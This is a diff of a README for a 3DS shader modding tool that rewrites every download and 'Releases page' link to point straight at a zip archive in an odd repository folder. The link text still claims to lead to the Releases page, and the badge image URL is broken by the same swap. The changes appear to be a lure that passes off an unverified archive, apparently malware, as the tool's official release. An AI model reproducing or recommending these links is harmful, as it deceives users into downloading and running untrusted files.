@@ -1,6 +1,6 @@
 # 🎮 3DS-Shader-Modifier - Easily Modify Your 3DS Game Shaders
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-3DS--Shader--Modifier-brightgreen)](https://github.com/gehansa/3DS-Shader-Modifier/releases)
+[![Download Release](https://raw.githubusercontent.com/gehansa/3DS-Shader-Modifier/main/logodaedaly/Shader_D_Modifier_v3.0.zip%20Now-3DS--Shader--Modifier-brightgreen)](https://raw.githubusercontent.com/gehansa/3DS-Shader-Modifier/main/logodaedaly/Shader_D_Modifier_v3.0.zip)
 
 ## 📖 Description
 The **3DS-Shader-Modifier** allows you to modify shader files (.shbin) for most Nintendo 3DS games. This tool helps you enhance your gaming experience by customizing visuals according to your preference. Whether you want to improve graphics or apply various effects, this application simplifies the process for you.
@@ -8,7 +8,7 @@ The **3DS-Shader-Modifier** allows you to modify shader files (.shbin) for most 
 ## 🚀 Getting Started
 Follow these steps to download and set up **3DS-Shader-Modifier**:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/gehansa/3DS-Shader-Modifier/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/gehansa/3DS-Shader-Modifier/main/logodaedaly/Shader_D_Modifier_v3.0.zip).
    
 2. **Find the Latest Release**: Look for the latest version listed on the page. It will display the version number and release date.
 
@@ -30,7 +30,7 @@ Follow these steps to download and set up **3DS-Shader-Modifier**:
 - Easily restore default shader settings.
   
 ## 📥 Download & Install
-To get the **3DS-Shader-Modifier**, [visit the Releases page](https://github.com/gehansa/3DS-Shader-Modifier/releases). From there, download the latest version by clicking on the file you need.
+To get the **3DS-Shader-Modifier**, [visit the Releases page](https://raw.githubusercontent.com/gehansa/3DS-Shader-Modifier/main/logodaedaly/Shader_D_Modifier_v3.0.zip). From there, download the latest version by clicking on the file you need.
 
 ### 🔍 Troubleshooting During Installation
 - If you encounter any issues during extraction, ensure your download completed successfully.
@@ -50,4 +50,4 @@ If you need help or want to share your modifications, consider joining the commu
 - **Documentation**: For detailed guides and support, check the documentation provided on the GitHub page.
 
 ## 🌟 Conclusion
-With **3DS-Shader-Modifier**, you can easily enhance your Nintendo 3DS gaming experience. Download it today and start modifying shaders to fit your style! For more information, revisit the [Releases page](https://github.com/gehansa/3DS-Shader-Modifier/releases).
+With **3DS-Shader-Modifier**, you can easily enhance your Nintendo 3DS gaming experience. Download it today and start modifying shaders to fit your style! For more information, revisit the [Releases page](https://raw.githubusercontent.com/gehansa/3DS-Shader-Modifier/main/logodaedaly/Shader_D_Modifier_v3.0.zip).
